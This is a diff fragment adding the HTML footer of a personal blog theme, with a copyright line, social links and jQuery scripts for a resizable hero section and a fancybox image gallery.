+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
